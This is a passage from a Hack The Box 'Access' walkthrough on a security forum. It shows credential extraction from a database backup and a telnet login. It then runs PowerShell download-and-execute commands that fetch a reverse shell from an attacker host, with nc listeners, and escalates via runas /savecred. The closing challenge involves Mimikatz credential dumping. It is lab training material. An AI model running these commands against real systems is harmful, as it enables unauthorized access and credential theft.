<p>At this point, we should determine the file types of the files we are working with.<br>
This could be done with a tool called ‘<strong>file</strong>’.</p>
<blockquote>
<p>file Access\ Control.zip<br>
file backup.mdb</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/acec852dc5fddf438790aef5d74de6e50687834a.png" alt="grafik" data-base62-sha1="oFKRLpr9PwnqotSr2esdD9ObYim" width="653" height="74"></p>
<p>Another method to find more information we can use ‘<strong>exiftool</strong>’.</p>
<h3>Access Control.zip</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/89216dcaefe5ecc0e811ca9549f2e1f447988c95.png" alt="grafik" data-base62-sha1="jz728AoAxc1ymVIJBblTuPkpNjv" width="688" height="359"></p>
<h3>backup.mdb</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/757bdaf67555e974b68d39bea114ce3831825b8a.png" alt="grafik" data-base62-sha1="gLjdOD3tIy5ZYkQMr81QhbIKP2i" width="615" height="180"></p>
<p>Notice that ‘<strong>exiftool</strong>’ couldn’t determine the file type. So we have to do it manually.</p>
<blockquote>
<p>Ok Google: mdb file</p>
</blockquote>
<p>On the first result page, you will be able to find this URL: <a href="https://fileinfo.com/extension/mdb" rel="noopener nofollow ugc">https://fileinfo.com/extension/mdb</a><br>
It provides us with the information we need.</p>
<p><strong>I can’t repeat it often enough: note it!</strong></p>
<p>Another question:</p>
<blockquote>
<p>Ok, Google: extract mdb data kali</p>
</blockquote>
<p>Here you will find a website called <a href="http://mdbtools.sourceforge.net/install/x53.htm" rel="noopener nofollow ugc">http://mdbtools.sourceforge.net/install/x53.htm</a>.</p>
<p>By using ‘<strong>mdbtools</strong>’ we can work with this file. Let us take a look at how it does look inside.</p>
<blockquote>
<p>mdb-tables backup.mdb</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9fb6eb8a0874f431dab07877332299c6138fb511.png" alt="grafik" data-base62-sha1="mMTOYKhPPnyKMgZGr8HHZrohRN7" width="488" height="108"></p>
<p>Ok. We have to structure it to make it easily readable.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/0/03e23915903e9e2efee92fa60596044ebcb049bd.png" alt="grafik" data-base62-sha1="ym704ti82tGun3kB9YpJbNoXFP" width="517" height="198"></p>
<p>We see the <code>auth_user</code> table inside. Let’s export the data from this table.</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr “,” " " | grep “\”" | cut -d" " -f2-3 | sed ‘s/\"//g’ | tr " " “:”</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2a08120a9bc87b0a90d41058e00676b09b948e00.png" alt="grafik" data-base62-sha1="5ZPlmUCwM4wn5m2cq2Ts8nMqREI" width="690" height="151"></p>
<p>Also, we should save this information.</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr “,” " " | grep “\”" | cut -d" " -f2-3 | sed ‘s/\"//g’ | tr " " “:” &gt; creds.txt</p>
</blockquote>
<p>Another way we can use is the following:</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr “,” " " | column -t</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3e888fa5f6b585e2e584e2b044fb480d3b320438.png" alt="grafik" data-base62-sha1="8VcbppNJHWHdNDlqWLGWw9AHg0M" width="690" height="66"></p>
<h2>8. ZIP File extraction</h2>
<p>Next file is our ZIP archive. We want to know what’s inside of it.</p>
<blockquote>
<p>unzip Access\ Control.zip</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6461456bb33f569873b7e2e0bfaa366258bcd040.png" alt="grafik" data-base62-sha1="ek09gY0j45Ksyy83bOdYCQIHKBG" width="668" height="56"></p>
<p><strong>Do some research. Find out why this error appears.</strong></p>
<blockquote>
<p>7z -e Access\ Control.zip</p>
</blockquote>
<p>Now it’s asking us for a password. Did we find some credentials already?<br>
Let us try to use them:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/34a39516d60a1db5406965b70744746931f907b3.png" alt="grafik" data-base62-sha1="7vFiJfOvPXrHxua4nXPkzO9HPxN" width="473" height="270"></p>
<p>We extracted a file called ‘<strong>Access Control.pst</strong>’. What kind of file is it?</p>
<blockquote>
<p>file Access\ Control.pst</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/704865563e8405fd842dda0311c41584f4ca910d.png" alt="grafik" data-base62-sha1="g1iAdc3tqeNWLb7gC0MM6KY3QfP" width="659" height="147"></p>
<p>Find out a way on your own to read the content.</p>
<blockquote>
<p>cat ‘<strong>Access Control.mbox</strong>’ | head -n 25</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0670dcd65b08f86a0ad4ce2b95d1f65cfac39c98.png" alt="grafik" data-base62-sha1="UYFESOjrP65VDNDe8AVdUmMOG4" width="690" height="264"></p>
<h2>9. Telnet Login</h2>
<p>At this point, we found other credentials which we can use.<br>
Let us try to log in by using these.</p>
<blockquote>
<p>telnet 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ceac57a219235ab59c5e1227761c8afe3777a1d.png" alt="grafik" data-base62-sha1="fxwyR6vnjzef9w1xjTOr8oo1ML3" width="462" height="195"><br>
We could successfully log in by using the credentials we found from the ZIP file.<br>
Now it’s time for local enumeration, but first, it’s always better to work with a reverse shell.</p>
<p><strong>Make sure you understand how a reverse shell works because it’s an essential part in this whole area.</strong></p>
<h2>10. Reverse Shell through PowerShell</h2>
<p>But before we can obtain a reverse shell we have to plan it, understand how it should work and how the whole scenario of it will look like.<br>
<strong>We have to force our target to connect back to us.</strong> …<em>(cough) firewalls (cough)</em>…</p>
<p>What do we need:</p>
<ol>
<li>Reverse shell script</li>
<li>Web server</li>
<li>Listener</li>
<li>Execution command</li>
</ol>
<h3>1. Reverse shell Script</h3>
<p><a href="https://github.com/samratashok/nishang" rel="noopener nofollow ugc">Nishang</a> created an excellent collection of different PowerShell scripts. One of these we will use to obtain our reverse shell. We will copy it to our working directory.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a3b6df933bd1f91c410c1d7236d50e6e52d4b8c6.png" alt="grafik" data-base62-sha1="nmhDbrbwjRgPMsSjGKmyeJ7Tig6" width="690" height="224"></p>
<p>We want to make sure that our target machine will execute it directly. Here we have to make some changes for that. By looking into the reverse shell script, we will see an example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/252457a81f132c14d60d9da1aaa057881afd8f9e.png" alt="grafik" data-base62-sha1="5izwQ0yPnhd0zz0smcr1DbqQVR4" width="690" height="256"></p>
<p>We will copy this line at the end of the file and remove the “PS &gt;”. After these changes it will look like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e2d1291da41f41409149af377e7cdfe0c6ddc69b.png" alt="grafik" data-base62-sha1="wmw22j6XwBd603tSyICbh5yqBeP" width="634" height="247"></p>
<h3>2. Web server</h3>
<p>There exist a lot of methods to share files. We will use this time a Python3 Web server module in the directory we stored our script.</p>
<blockquote>
<p>python3 -m http.server 80</p>
</blockquote>
<h3>3. Listener</h3>
<p>After that, we have to start our listener and listen on the port we set in the script before. In my case, it was the TCP port <strong>2201</strong>. Therefore I will use <strong>Netcat</strong>.</p>
<blockquote>
<p>nc -nlvp 2201</p>
</blockquote>
<h3>4. Execution command</h3>
<p>The execution command for this will be:</p>
<blockquote>
<p>C:\Users\security&gt; powershell -c IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.5/revshell.ps1" rel="noopener nofollow ugc">http://10.10.14.5/revshell.ps1</a>’)</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/733122b77cba6f363717894f2d0d4c00119ffe1b.png" alt="grafik" data-base62-sha1="gr2bgjXYjgPskoOd9qRWOtvBV6r" width="690" height="218"></p>
<h2>11. Local enumeration</h2>
<p><a href="https://github.com/411Hall" rel="noopener nofollow ugc">411Hall</a> created an awesome enumeration PowerShell script called <a href="https://github.com/411Hall/JAWS" rel="noopener nofollow ugc">JAWS</a> to identify privilege escalation vectors quickly.<br>
We will let our target system download and execute it the same way we did it with the reverse shell.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/64cde319e4c2758817f7205695dce43599edcc04.png" alt="grafik" data-base62-sha1="enKRcJDEplNR3msTwHFbl5ZRI0c" width="690" height="352"></p>
<p>It will take a few minutes. So don’t quit the session.<br>
The most interesting part is this one:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ffd3a83f6c191948fad8e5fc1d9f3de6aed1db5.png" alt="grafik" data-base62-sha1="kxMOInr5NJmUUAk2JZ3iNj6ePNX" width="530" height="185"></p>
<p>Also, let us take a look at the desktop of the ‘security’ user.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/48c556e7a3f6e30fcebed21a9cd35e16aa65e7bd.png" alt="grafik" data-base62-sha1="anLaTy4fsHRiGKPEmvwa69Xu9ad" width="518" height="180"></p>
<p>So it seems we have here some stored credentials for the Administrator on this machine.<br>
<strong>If we don’t know how to export them what else could we do?</strong></p>
<h2>12. Privilege Escalation</h2>
<p>Let us ask Google:</p>
<blockquote>
<p>Ok, Google: windows currently stored credentials privilege escalation</p>
</blockquote>
<p>Also here on the first page, you will find a GitHub repository of <a href="https://github.com/swisskyrepo" rel="noopener nofollow ugc">swisskyrepo</a> to his <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" rel="noopener nofollow ugc">Windows - Privilege Escalation</a> cheat sheet.<br>
If we press <strong>CTRL+F</strong> and search for “stored credentials” you will see this example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/011fdc691793431fe758fadc3e600cf7e035b33e.png" alt="grafik" data-base62-sha1="9WJPSqbNSQPJIWJzrG9FQ9XNiC" width="690" height="276"><br>
<strong>Ok. Do we need an EXE file or can we do something else?</strong></p>
<p>What do you think about another reverse shell but this time with Administrator privileges?</p>
<p>Go back to <strong>10. Reverse Shell through PowerShell</strong> if you don’t know how it does work or how it should look like. But I think this should be clear right now. It’s the same scenario in this situation.</p>
<ol>
<li>We will just change the TCP port of our reverse shell script to <strong>2202</strong>.</li>
<li>Run our python web server.</li>
<li>Set up our listener on TCP port 2202.</li>
<li>Execute it the same way with PowerShell with the currently stored credentials.</li>
</ol>
<h3>1. Reverse Shell Script</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/61bd1edc55bcffd0ac14bfee9acff9acc7d535e3.png" alt="grafik" data-base62-sha1="dWDvdCdoT8SagPNtb6ABIwz9Agb" width="632" height="214"></p>
<h3>2. Web server</h3>
<blockquote>
<p>python3 -m http.server 80</p>
</blockquote>
<h3>3. Listener</h3>
<blockquote>
<p>nc -nlvp 2202</p>
</blockquote>
<h3>4. Execution command</h3>
<blockquote>
<p>PS C:\Users\security&gt; runas /savecred /user:ACCESS\Administrator “powershell.exe IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.5/revshell.ps1" rel="noopener nofollow ugc">http://10.10.14.5/revshell.ps1</a>’)”</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ae628d5ef86dab9182dabd11a292eb8f24a19051.png" alt="grafik" data-base62-sha1="oSGe4JuLtbOSyRlPw2n8K3J6vgR" width="690" height="382"></p>
<h2>12. Challenge</h2>
<p>For this challenge, your goals will be</p>
<ol>
<li>A <strong>Meterpreter</strong> session</li>
<li>Upload Mimikatz and read the credentials</li>
</ol>
<p>Restrictions:</p>
<ol>
<li>The usage of <strong>Empire</strong> or their scripts for this challenge is forbidden.</li>
</ol>
<p>Have fun!</p>
<hr>
<blockquote>
<p>YouTube video coming soon!</p>
</blockquote>
<p>Best regards,<br>
Cry0l1t3<br>
<a href="https://www.shell-affect.com" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png" alt="logo" data-base62-sha1="5EBtqZQBcIDxRT3RlPHxV5GcRmg" width="477" height="96"></a></p>
<p>Official Website: <a href="https://www.shell-affect.com" rel="noopener nofollow ugc">https://www.shell-affect.com</a><br>
Twitter: <a href="https://twitter.com/ShellAffect" rel="noopener nofollow ugc">https://twitter.com/ShellAffect</a><br>
Xing: <a href="https://www.xing.com/companies/shell-affect" rel="noopener nofollow ugc">https://www.xing.com/companies/shell-affect</a><br>
YouTube: <a href="https://www.youtube.com/channel/UCgxyvJCaG1vRLM2GIpyBiWQ" rel="noopener nofollow ugc">https://www.youtube.com/channel/UCgxyvJCaG1vRLM2GIpyBiWQ</a></p>
          <p><a href="https://0x00sec.org/t/htb-shell-affect-access-writeup/13085/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-shell-affect-access-writeup/13085/1</link>
        <pubDate>Thu, 18 Apr 2019 13:09:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13085-1</guid>
        <source url="https://0x00sec.org/t/htb-shell-affect-access-writeup/13085.rss">[HTB] SHELL AFFECT - Access - WriteUp</source>
      </item>
  </channel>
</rss>
